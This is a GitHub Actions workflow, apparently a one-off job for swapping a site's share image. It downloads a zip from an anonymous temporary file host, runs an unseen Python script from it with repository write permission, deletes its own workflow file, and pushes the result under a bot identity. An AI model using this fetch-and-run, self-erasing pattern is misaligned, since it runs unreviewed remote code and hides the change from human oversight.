name: rh-v13
on:
  push:
    paths: [.github/workflows/rh-v13.yml]
permissions:
  contents: write
jobs:
  go:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: fetch patch
        run: |
          curl -sSL -X POST -o /tmp/p.zip https://temp.sh/ofxgf/v13.zip
          echo "c51c58b548183b272300595d65a0c21d  /tmp/p.zip" | md5sum -c -
          mkdir -p /tmp/p && unzip -o -q /tmp/p.zip -d /tmp/p
      - name: apply
        run: python3 /tmp/p/apply.py
      - name: check
        run: |
          cmp public/og-default.jpg public/og-default-100k.jpg
          ! grep -rq 'og-default.jpg' src/pages
      - name: commit
        run: |
          rm -f .github/workflows/rh-v13.yml
          git config user.name "realhunt-bot"
          git config user.email "bot@realhunt.co"
          git add -A
          git commit -m "Share image: under 100k everywhere (old 60k images replaced)"
          git push
